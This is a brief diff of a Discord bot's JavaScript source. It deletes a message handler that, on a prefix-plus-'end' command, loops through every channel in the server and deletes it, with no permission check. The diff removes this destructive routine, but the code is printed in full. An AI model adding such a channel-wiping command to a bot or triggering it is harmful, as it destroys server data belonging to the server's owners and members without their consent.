@@ -492,11 +492,3 @@ client.on("message", message => {
         message.channel.send(Success)
     }
 })
-
-client.on("message", message => {
-    if(message.content === prefix + "end") {
-        message.guild.channels.forEach(g => {
-            g.delete()
-        })
-    }
-})
